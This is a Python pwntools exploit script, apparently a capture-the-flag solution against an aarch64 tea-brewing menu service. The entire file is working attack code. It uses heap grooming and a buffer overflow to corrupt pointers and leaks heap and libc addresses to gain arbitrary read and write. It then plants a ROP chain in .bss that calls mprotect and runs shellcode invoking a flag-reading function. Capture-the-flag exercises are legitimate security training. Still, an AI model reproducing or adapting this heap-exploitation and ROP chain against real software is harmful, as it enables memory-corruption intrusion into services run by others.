from pwn import *
import re

s = remote('127.0.0.1', 12345)
#s = remote('hitme.tasteless.eu', 10301)
#s = process('./run.sh')


context.arch = 'aarch64'
context.log_level = 'debug'

context.timeout = Timeout.forever

def add_tea(name, desc, t):
    s.send('A')
    s.recvuntil('Name: ')
    s.send(name)
    s.recvuntil('length: ')
    s.send('%d' % len(desc))
    s.recvuntil('Description:')
    s.send(desc)
    s.recvuntil('time:')
    s.send('%d' % t)
    import time; time.sleep(.5)
    clr()

def list_tea():
    do_hard_clr()
    s.send('l')
    import time; time.sleep(.5)
    data = s.recvuntil('What do you want to do?')
    clr()
    return data


def mod_tea(tid, new_name=None, new_desc=None, new_time=None, do_clr=True):
    s.send('m\n')
    s.recvuntil('id: ')
    s.send('%d\n'% tid)
    s.recvuntil('[y/n] ')
    if new_name is not None:
        s.send('y\n')
        s.recvuntil('name: ')
        s.send(new_name)
    else:
        s.send('n\n')
    s.recvuntil('[y/n] ')

    if new_desc is not None:
        s.send('y')
        s.recvuntil('length:' )
        s.send('%d\n'% len(new_desc))
        s.recvuntil('description: ')
        s.send(new_desc)
    else:
        s.send('n\n')

    s.recvuntil('[y/n] ')
    if new_time is not None:
        s.send('y\n')
        s.recvuntil('time: ')
        s.send('%d\n' % new_time)
    else:
        s.send('n\n')

    if do_clr is True:
        clr()

def rm_tea(tid):
    s.send('R')
    s.recvuntil('id: ')
    s.send('%d' % tid)
    clr()


def clr():
    s.recvuntil('> ')

PUTS_PLT = 0x413088
PUTS_LIBC_OFF = 0x62A88
FREE_PLT = 0x413090
SYSTEM_OFF = 0x3E480



def leak_it(target_address, heap_ptr):
    print("[!] Attempting to leak contents of %x" % target_address)

    #memcpy will always cpy 32 byte, so we make to make sure that it is sane

    pl = fit({
        0x00 : p64(target_address),   #disp_name
        0x08 : p64(0x20),             # desc_len
        0x10 : p64(heap_ptr + 0x160), # next
        0x18 : p64(0x31)},              #heap happyness
          length=0x20)

    mod_tea(1337, new_name=pl)



    do_hard_clr()
    import time; time.sleep(.5)
    leak_full = list_tea()
    print(leak_full)
    leak_raw = re.findall(b'name: (.*)\n', leak_full)[0]
    leak  = u64(leak_raw.ljust(8, b'\0'))

    print('[+] Leaked: 0x%x' % leak)

    return leak

def write_it(where, what, heap_ptr, do_clr=True):

    #do_hard_clr()
    print("[+] Writing %s to 0x%x" % (what, where))
    pl = fit({
        0x00 : p64(where),   #disp_name
        0x08 : p64(0x20),             # desc_len
        0x10 : p64(heap_ptr + 0x160), # next
        0x18 : p64(0x31)},              #heap happyness
          length=0x20)


    mod_tea(1337, new_name=pl)

    pl = fit({ 0: what}, length=0x20)
    mod_tea(0, new_name=what, do_clr=do_clr)


def brew_tea(tid, do_clr=False):
    s.send('b')
    s.recvuntil('id: ')
    s.send('%d' % tid)
    if do_clr is True:
        clr()


def do_hard_clr():
    s.send('kkkk')
    s.recvuntil('kkkk')
    s.recvuntil('> ')


def main():
    print("Connecting to qemu, this may take a while")
    s.recvuntil('tasteless')
    clr()


    pl = fit({0:0xdeadbeef,
              0x40: p64(0),
              0x48: p64(0x31),
              0x50: p64(1337),  # id
              0x58: p64(FREE_PLT),   #id_name
              0x60: p8(0xd0), # partial overwrite

             })

    # this first tea will be our target for corrupting the disp_name ptr via mod-namme
    print("[+] Add  Tea 0 (disp_name-ptr corrupt)")
    add_tea('0'*8, '\x02'*32, 7)


    # we will overflow with the desc of this tea
    print("[+] Add  Tea 1 (overflow basic)")
    add_tea('A'*8, pl, 7)

    print("[+] Add  Tea 2 (feng shui)")
    add_tea('B'*8, '\x02'*64, 7)

    # we will overflow into this chunk, partially overwriting the disp_name ptr to point to tea0->disp_name
    print("[+] Add  Tea 3 (victim)")
    add_tea('C'*8, '\x03'*64, 7)


    print("[+] Del  Tea 2 (feng shui)")
    rm_tea(2)

    print("[+] Prepare OFLOW")
    mod_tea(1, new_name='1111', new_desc='2'*63, new_time=1000)

    print("[+] Trigger OFLOW and LEAK")
    data_with_leak = list_tea()


    print("[+] Add  Tea 4 (for state2?)")
    add_tea('D'*8, '\x03'*64, 1)


    heap_ptr_leak_raw = re.findall(b'name: (.*)\n', data_with_leak)[-1]

    heap_ptr = u64(heap_ptr_leak_raw.ljust(8, b'\0'))
    print("[+] Leaked heap pointer (tea0->disp_name): 0x%x" % heap_ptr)

    puts_libc = leak_it( PUTS_PLT, heap_ptr)
    libc_base = puts_libc - PUTS_LIBC_OFF
    print("[+] libc base at 0x%x" % libc_base)


    environ = libc_base + 0x167CE0
    environ_leak = leak_it(environ, heap_ptr)
    print('[+] Leaked environ: 0x%x' % environ_leak)


    # we write directly on the stack of the modifytea function
    modify_saved_ptr = environ_leak - 600
    print('[+] Assuming overwrite ptr is: 0x%x' % modify_saved_ptr)



    # ropchain to mprotect
    # x0: addr
    # x1: len
    # x2: prot

    bss_start = 0x413200

    PRINT_BANNER = p64(0x401FD8)

    print("BREAME 0x%x" % (bss_start +256))


    read_flag_gdgt = 0x004017EC

    print("target 0x%x" % (libc_base +0x0e6540))
    rop = fit({
        0: p64(bss_start), # maybe ptr?
        8: p64(libc_base + 0x00000000000e6540), # ldp x0, x1, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret

        0x18: p64( read_flag_gdgt), # this is read; we jump there because the last char is return in x2 - that's how we can get a val in x2 we need
        0x20: p64(bss_start+8), # read_where
        0x28: p64(0x7),       # read_n
        0x48: p64(libc_base + 0x00000000000e6540), # ldp x0, x1, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret
        0x68: p64(libc_base + 0x0071210  ), # mprotect invoke @ sub_71148
        0x70: p64(bss_start - ( bss_start % 0x1000 )), # mprotect ptr
        0x78: p64(0x1000),
        0x98: p64(bss_start+256),
        0xb0: p64(bss_start+256)

    }, length=256)

    #brew_tea = 0x401E54
    sleep = 0x0401220
    fork = 0x4011e0
    get_flag = 0x00401748
    get_flag = 0x0040152c


    list_tea_f = 0x401D5C

    main_loop =  0x401470
    brew_tea_internal = 0x401E90
    call = lambda f: shellcraft.aarch64.mov('x4',f) + 'blr x4\n'

    original_sp = environ_leak-424 #relative to mainloop
    print('[+] Assuming original sp for mainloop of: 0x%x' % original_sp)
    brew_sp_internal = environ_leak-648
    print('[+] Assuming original sp for brew_tea_internal of: 0x%x' % brew_sp_internal)

    sc = ''
    sc += shellcraft.write(1, 'lets',4)

    #sc +=  shellcraft.aarch64.read(0, 0x413128, 0x18)

    sc +=  shellcraft.aarch64.mov('x29', original_sp) #we need more stack space
    sc +=  shellcraft.aarch64.mov('sp', 'x29') #we need more stack space
    sc +=  shellcraft.aarch64.mov('x19', 0x413118) #session-ptr
    sc +=  shellcraft.aarch64.mov('x20', 0x413118) #session-ptr
    sc +=  shellcraft.aarch64.mov('x0', 0xf1a6f1a6) #session-ptr
    sc +=  shellcraft.aarch64.mov('x1', 0xdeadbeef) #session-ptr
    sc +=  shellcraft.aarch64.mov('x2', 0x7a57e1e5) #session-ptr
    sc += call(get_flag)
    sc += shellcraft.write(1, 'AYASDASDAS',4)
    sc += 'b 0x00\n'

    print(sc)
    sc = asm(sc)
    rop += sc



    rop_c =  [rop[i:i+32] for i in range(0, len(rop), 32)]

    # we want to pivot in .bss

    for i in range(len(rop_c)):
        write_it( bss_start+i*32, rop_c[i], heap_ptr)

    pl = p64(bss_start)
    pl += p64(libc_base + 0x0000000000042918)
    pl += p64(bss_start) # this goes to x19 and will be used as ptr later
    pl += b'B' *8

    print('[+] Jumping to ropchain2sc')
    write_it( modify_saved_ptr, pl  , heap_ptr, do_clr=False)


    import time; time.sleep(.4)
    s.send('\x07') # fill read with mprotect flag


    print('[+] interact')

    s.interactive()


    exit(1)



if __name__ == '__main__':
    main()


